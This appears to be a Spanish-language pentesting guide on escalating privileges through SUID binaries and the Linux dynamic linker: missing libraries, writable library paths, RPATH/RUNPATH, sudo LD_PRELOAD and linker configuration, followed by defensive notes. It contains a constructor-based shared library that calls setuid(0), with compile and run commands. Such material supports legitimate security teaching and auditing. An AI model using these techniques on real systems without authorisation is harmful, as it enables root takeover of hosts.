# Abuso de bibliotecas compartidas y del linker SUID

{{#include ../../banners/hacktricks-training.md}}

Los binarios SUID suelen revisarse para detectar la ejecución directa de comandos, pero los programas SUID personalizados también pueden ser vulnerables a través del linker dinámico. El tema común es sencillo: un ejecutable con privilegios carga código desde una ruta o configuración que puede controlar un usuario con menos privilegios.<sup>[[1]](#references)</sup>

Esta página se centra en patrones de técnicas genéricas: bibliotecas ausentes, directorios de bibliotecas con permisos de escritura, `RPATH`/`RUNPATH`, `LD_PRELOAD` a través de sudo, configuración del linker y confusión con hardlinks SUID.

Para consultar los encabezados de programa ELF, la sección dinámica y el comportamiento del loader detrás de estas comprobaciones, consulta [Información básica de ELF](../../binary-exploitation/basic-stack-binary-exploitation-methodology/elf-tricks.md).

## Enumeración rápida

Empieza buscando archivos SUID inusuales y comprobando si están enlazados dinámicamente:<sup>[[1]](#references)[[3]](#references)</sup>

```bash
find / -perm -4000 -type f -ls 2>/dev/null
file /path/to/suid-binary
readelf -d /path/to/suid-binary 2>/dev/null | egrep 'NEEDED|RPATH|RUNPATH'
```

Usa `readelf` con ejecutables desconocidos: [`ldd` puede ejecutar un intérprete ELF no confiable](https://man7.org/linux/man-pages/man1/ldd.1.html). `readelf` muestra las dependencias directas, así que confirma por separado la ruta que realmente elige el cargador.<sup>[[1]](#references)[[3]](#references)</sup>

Presta atención a ubicaciones no estándar, rutas de aplicaciones personalizadas, binarios propiedad de root que estén fuera de directorios administrados por paquetes y dependencias cargadas desde directorios con permisos de escritura.<sup>[[1]](#references)</sup>

Comprobaciones útiles de permisos de escritura:

```bash
readelf -d /path/to/suid-binary 2>/dev/null | egrep 'RPATH|RUNPATH'
find / -writable -type d 2>/dev/null | head -n 50
```

## Missing Shared Object Injection

Algunos binarios SUID personalizados intentan cargar un objeto compartido que no existe. Si la ruta inexistente está dentro de un directorio controlado por el atacante, el binario puede cargar código proporcionado por el atacante con los privilegios del usuario efectivo.<sup>[[1]](#references)</sup>

El mismo límite se aplica a un **binario personalizado permitido mediante sudo** cuando llama a `dlopen()` con una ruta absoluta a un `.so` dentro de un directorio de inicio o de configuración en el que quien lo invoca puede escribir. Es posible que esta carga tardía de bibliotecas no aparezca en `ldd` ni en las entradas ELF `NEEDED`. Una revisión acotada con `strings` o el rastreo de una ejecución **sin privilegios** puede revelar la ruta que se intenta usar; una contraseña de la aplicación o una opción del menú podrían condicionar la búsqueda. Confirma la regla exacta de sudo, la ruta y los permisos del directorio padre, y que la ejecución con privilegios llegue a esa búsqueda antes de considerarlo una escalada. No invoques el objetivo de sudo solo para enumerarlo.

Encuentra las búsquedas fallidas de bibliotecas con el filtro de llamadas al sistema de `strace`:<sup>[[2]](#references)</sup>

```bash
strace -f -e trace=openat,access /path/to/suid-binary 2>&1 | grep -Ei 'ENOENT|\\.so'
```

Si el binario busca `libexample.so` en una ruta con permisos de escritura, una biblioteca de prueba mínima puede usar un constructor. Mantén inocua la demostración del impacto durante la validación:<sup>[[6]](#references)</sup>

```c
#include <stdlib.h>
#include <unistd.h>

__attribute__((constructor))
static void init(void) {
    setuid(0);
    setgid(0);
    system("id > /tmp/suid-so-ran");
}
```

Compílalo con el nombre de archivo exacto que el binario intenta cargar:

```bash
gcc -shared -fPIC proof.c -o /writable/path/libexample.so
/path/to/suid-binary
cat /tmp/suid-so-ran
```

La condición explotable no es únicamente la ausencia de la biblioteca. El atacante debe poder colocar un objeto compartido compatible en una ruta que el loader privilegiado acepte.<sup>[[1]](#references)</sup>

## Directorio de biblioteca con permisos de escritura

A veces existen todas las dependencias, pero uno de los directorios usados para resolverlas permite escritura. Esto puede permitir reemplazar una biblioteca cargada o colocar una biblioteca con el mismo nombre y mayor prioridad.<sup>[[1]](#references)</sup>

La misma revisión se aplica a un ELF personalizado **permitido mediante sudo**, incluso si el ELF no tiene el bit SUID y la cuenta RunAs permitida no es root. Compara sus entradas `DT_NEEDED` con la ruta de la biblioteca que resolverá el loader; luego comprueba si quien invoca puede escribir en ese archivo o reemplazarlo mediante un directorio padre con permisos de escritura y búsqueda. Confirma la regla exacta de sudo RunAs, los symlinks y las ACL, la política del loader y que el proceso de destino cargue la biblioteca como la cuenta con más privilegios. Un `.so` con permisos de escritura o un nombre de dependencia por sí solo es solo un indicio; inspecciona los metadatos sin ejecutar el comando sudo.<sup>[[1]](#references)[[3]](#references)[[5]](#references)</sup>

Revisa las rutas de dependencias:<sup>[[1]](#references)[[3]](#references)</sup>

```bash
readelf -d /path/to/suid-binary 2>/dev/null | egrep 'NEEDED|RPATH|RUNPATH'
namei -om /path/to/library.so
```

Si el directorio permite escritura, valida en un laboratorio con un enfoque seguro que use una copia. Reemplazar bibliotecas del sistema en un host activo puede dejar procesos que se inician al mismo tiempo con versiones de bibliotecas incompatibles.<sup>[[8]](#references)</sup>

### Bibliotecas escribibles dentro de un chroot

Un chroot por sí solo no cierra los descriptores de archivo heredados ni restringe todo el acceso al sistema de archivos. Si un sandbox deja un descriptor de directorio que apunta fuera de su nueva raíz y el proceso enjaulado puede desreferenciar ese descriptor (por ejemplo, mediante una entrada accesible en `/proc/<pid>/fd/`), es posible que las rutas del host sigan siendo accesibles. Esto es un problema de límites del sistema de archivos; por sí solo no otorga privilegios de root.<sup>[[11]](#references)[[12]](#references)</sup>

Comprueba por separado si el usuario enjaulado puede escribir en un directorio de bibliotecas que utilizará un **ejecutable del host con SUID de root** al iniciarse desde el jail. El loader resuelve las dependencias según la vista del sistema de archivos del proceso, así que una biblioteca controlada por un atacante en ese lugar podría ejecutarse con la identidad efectiva del programa SUID. Confirma el ejecutable exacto, su bit SUID y la política de montaje, el destino del descriptor y los permisos de acceso, la ruta de búsqueda de bibliotecas del jail y que el programa realmente pueda acceder al ejecutable del host. Una capacidad de archivo en el lanzador del sandbox, un jail con permisos de escritura o un binario SUID del host por sí solos son solo pistas; la cadena completa depende de la implementación del sandbox.<sup>[[1]](#references)[[11]](#references)[[12]](#references)</sup>

## RPATH y RUNPATH

`RPATH` y `RUNPATH` son entradas de la sección dinámica que indican al loader dónde buscar bibliotecas. Son peligrosas en programas SUID cuando apuntan a directorios en los que un atacante puede escribir.<sup>[[1]](#references)</sup>

Detéctalas:<sup>[[3]](#references)[[10]](#references)</sup>

```bash
readelf -d /path/to/suid-binary | egrep 'RPATH|RUNPATH'
objdump -p /path/to/suid-binary 2>/dev/null | egrep 'RPATH|RUNPATH'
```

Ejemplo de salida riesgosa:

```text
0x000000000000001d (RUNPATH)            Library runpath: [/opt/app/lib]
0x0000000000000001 (NEEDED)             Shared library: [libcustom.so]
```

Si se puede escribir en `/opt/app/lib` y el binario necesita `libcustom.so`, el atacante podría colocar allí una `libcustom.so` maliciosa:<sup>[[1]](#references)</sup>

```bash
ls -ld /opt/app/lib
gcc -shared -fPIC proof.c -o /opt/app/lib/libcustom.so
/path/to/suid-binary
```

`RPATH` y `RUNPATH` no son idénticos en todos los detalles de resolución, pero para revisar la escalada de privilegios la pregunta práctica es la misma: ¿el binario SUID busca un directorio escribible por un atacante para encontrar el nombre de una biblioteca?<sup>[[1]](#references)</sup>

## LD_PRELOAD, LD_LIBRARY_PATH y SUID

En los programas normales, `LD_PRELOAD` y `LD_LIBRARY_PATH` pueden forzar o influir en la carga de objetos compartidos. En los programas SUID, el cargador dinámico normalmente entra en modo de ejecución segura e ignora las variables de entorno peligrosas.<sup>[[1]](#references)</sup>

Esto significa que un binario SUID común normalmente no es vulnerable solo porque el usuario pueda configurar `LD_PRELOAD`:<sup>[[1]](#references)</sup>

```bash
LD_PRELOAD=/tmp/proof.so /path/to/suid-binary
```

La excepción habitual es una política de sudo que permite asignar variables de entorno en la línea de comandos para el objetivo, como una etiqueta `SETENV` o una opción `setenv` aplicable. Si el objetivo está enlazado dinámicamente y sudo acepta `LD_PRELOAD=/path/to/library`, el objetivo podría cargar código controlado por quien lo invoca. Comprueba la regla efectiva y la identidad del objetivo. Añadir `LD_PRELOAD` a `env_keep` no basta en sistemas donde el cargador dinámico elimina un `LD_PRELOAD` heredado antes de que se inicie el proceso SUID de `sudo`; sudo evalúa una asignación en la línea de comandos después de su propio inicio.<sup>[[1]](#references)[[4]](#references)[[5]](#references)</sup>

```bash
sudo -l
# Check SETENV/setenv and the target command's allowed arguments
sudo LD_PRELOAD=/tmp/proof.so /allowed/command
```

No confundas estos casos; las reglas del loader y de la política de sudo anteriores los distinguen:<sup>[[1]](#references)[[4]](#references)[[5]](#references)</sup>

- `LD_PRELOAD` contra un binario SUID normal: normalmente se bloquea durante la ejecución segura.
- `LD_PRELOAD` aceptado como asignación en la línea de comandos de sudo para un objetivo privilegiado y enlazado dinámicamente: potencialmente explotable.
- Archivo `.so` ausente en una ruta con permisos de escritura: explotable cuando el binario SUID carga esa ruta de forma natural.
- `RPATH`/`RUNPATH` a un directorio con permisos de escritura: explotable cuando se puede controlar una biblioteca necesaria.
- Acceso de escritura a `/etc/ld.so.preload` o a la configuración del linker: afecta a todo el sistema y tiene un gran impacto.

## Configuración del linker

`ld.so` usa la caché del linker y `/etc/ld.so.preload`; `ldconfig` genera esa caché a partir de `/etc/ld.so.conf` y de los archivos que este incluye, normalmente desde `/etc/ld.so.conf.d/`.<sup>[[1]](#references)[[7]](#references)[[8]](#references)</sup>

Comprobaciones de alto valor:

```bash
ls -l /etc/ld.so.preload /etc/ld.so.conf 2>/dev/null
find /etc/ld.so.conf.d -type f -writable -ls 2>/dev/null
find /etc/ld.so.conf.d -type d -writable -ls 2>/dev/null
ldconfig -v 2>/dev/null | head -n 50
```

La configuración del enlazador con permisos de escritura suele ser más grave que un único binario SUID vulnerable, porque puede afectar a muchos procesos enlazados dinámicamente. `/etc/ld.so.preload` es especialmente peligroso, ya que puede forzar la carga de un objeto compartido en procesos privilegiados.<sup>[[1]](#references)[[7]](#references)[[8]](#references)</sup>

## Confusión de enlaces duros SUID

Los enlaces duros pueden hacer que el mismo inodo SUID aparezca con varios nombres.<sup>[[9]](#references)</sup> Esto sirve para ocultar un helper privilegiado, confundir la limpieza o eludir revisiones ingenuas basadas en rutas.

Busca archivos SUID con más de un enlace:<sup>[[9]](#references)</sup>

```bash
find / -xdev -perm -4000 -type f -links +1 -ls 2>/dev/null
```

Inspecciona todas las rutas al mismo inode:<sup>[[9]](#references)</sup>

```bash
stat /path/to/suid-wrapper
find / -xdev -samefile /path/to/suid-wrapper -ls 2>/dev/null
```

El abuso no consiste en que un enlace duro cambie los permisos. El abuso radica en la confusión de rutas: es posible acceder a un inode privilegiado mediante un nombre que los defensores o los scripts no esperan.<sup>[[9]](#references)</sup> Para profundizar en los inodes y el flujo de trabajo con enlaces duros, consulta [Sistema de archivos, inodes y recuperación](../main-system-information/filesystem-inodes-and-recovery.md).

## Defensive Notes

- Mantén los binarios SUID al mínimo, auditados y gestionados mediante paquetes siempre que sea posible.
- Evita las entradas `RPATH`/`RUNPATH` que apunten a directorios donde los usuarios puedan escribir o que gestione una aplicación.<sup>[[1]](#references)[[8]](#references)</sup>
- Mantén los directorios de bibliotecas bajo la propiedad de root y sin permisos de escritura para los usuarios habituales.<sup>[[8]](#references)</sup>
- No conserves `LD_PRELOAD`, `LD_LIBRARY_PATH` ni variables similares del cargador mediante sudo.<sup>[[1]](#references)[[5]](#references)</sup>
- Supervisa `/etc/ld.so.preload`, `/etc/ld.so.conf`, `/etc/ld.so.conf.d/` y los archivos SUID inesperados.<sup>[[1]](#references)[[7]](#references)[[8]](#references)</sup>
- Revisa los archivos SUID con enlaces duros e investiga los wrappers SUID personalizados fuera de las rutas estándar del sistema.<sup>[[9]](#references)</sup>

## References

- [1] [ld.so(8) — página del manual de Linux](https://man7.org/linux/man-pages/man8/ld.so.8.html)
- [2] [strace(1) — página del manual de Linux](https://man7.org/linux/man-pages/man1/strace.1.html)
- [3] [readelf (utilidades binarias de GNU)](https://sourceware.org/binutils/docs/binutils/readelf.html)
- [4] [sudo(8) — página del manual de Linux](https://www.man7.org/linux/man-pages/man8/sudo.8.html)
- [5] [sudoers(5) — página del manual de Linux](https://man7.org/linux/man-pages/man5/sudoers.5.html)
- [6] [Atributos comunes (GCC)](https://gcc.gnu.org/onlinedocs/gcc/Common-Attributes.html)
- [7] [ldconfig(8) — página del manual de Linux](https://man7.org/linux/man-pages/man8/ldconfig.8.html)
- [8] [Refuerzo de seguridad del enlazador dinámico (la biblioteca C de GNU)](https://www.sourceware.org/glibc/manual/latest/html_node/Dynamic-Linker-Hardening.html)
- [9] [Enlaces duros (GNU Findutils)](https://www.gnu.org/software/findutils/manual/html_node/find_html/Hard-Links.html)
- [10] [objdump (utilidades binarias de GNU)](https://www.sourceware.org/binutils/docs/binutils/objdump.html)
- [11] [chroot(2) — página del manual de Linux](https://man7.org/linux/man-pages/man2/chroot.2.html)
- [12] [proc_pid_fd(5) — página del manual de Linux](https://man7.org/linux/man-pages/man5/proc_pid_fd.5.html)
{{#include ../../banners/hacktricks-training.md}}
